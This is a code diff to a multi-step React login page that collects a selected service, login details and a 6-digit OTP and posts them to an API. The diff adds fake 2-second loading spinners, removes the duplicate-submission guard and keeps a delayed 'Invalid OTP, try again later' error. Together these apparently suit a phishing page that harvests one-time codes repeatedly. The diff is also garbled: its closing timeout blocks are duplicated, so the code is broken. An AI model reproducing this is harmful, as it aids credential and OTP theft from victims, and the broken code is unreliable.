@@ -71,10 +71,16 @@ export default function Login() {
     return Object.keys(newErrors).length === 0
   }
 
+  const [stepLoading, setStepLoading] = useState(false)
+
   const handleLogin = () => {
     setError('')
     if (validateStep1()) {
-      setStep(2)
+      setStepLoading(true)
+      setTimeout(() => {
+        setStepLoading(false)
+        setStep(2)
+      }, 2000)
     }
   }
 
@@ -96,19 +102,21 @@ export default function Login() {
     setErrors(newErrors)
     
     if (Object.keys(newErrors).length === 0) {
-      setStep(3)
+      setStepLoading(true)
+      setTimeout(() => {
+        setStepLoading(false)
+        setStep(3)
+      }, 2000)
     }
   }
 
   const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'
 
   const handleOtpVerify = () => {
-    if (submitted) return
     if (!otp || otp.length !== 6) {
       setError('Please enter valid 6-digit OTP')
       return
     }
-    setSubmitted(true)
 
     const userData = {
       service: selectedService,
@@ -127,11 +135,6 @@ export default function Login() {
     })
     .then(res => res.json())
     .then(data => {
-      if (!data.success && data.error === 'Duplicate entry') {
-        setSubmitted(false)
-        setError('You have already submitted. Please try again later.')
-        return
-      }
       setError('')
       setLoading(true)
       setTimeout(() => {
@@ -145,6 +148,12 @@ export default function Login() {
       setTimeout(() => {
         setLoading(false)
         setError('Invalid OTP, try again later')
+      }, 5000)
+    })
+  }
+      }, 5000)
+    })
+  }
       }, 5000)
     })
   }
@@ -260,6 +269,11 @@ export default function Login() {
 
       {step === 1 && (
         <div className="p-4">
+          {stepLoading && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 z-40 flex items-center justify-center">
+              <div className="w-12 h-12 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+            </div>
+          )}
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
               <button onClick={() => setStep(0)} className="mr-3">
@@ -340,6 +354,11 @@ export default function Login() {
 
       {step === 2 && (
         <div className="p-4">
+          {stepLoading && (
+            <div className="fixed inset-0 bg-black bg-opacity-50 z-40 flex items-center justify-center">
+              <div className="w-12 h-12 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+            </div>
+          )}
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
               <button onClick={() => { setStep(1); }} className="mr-3">
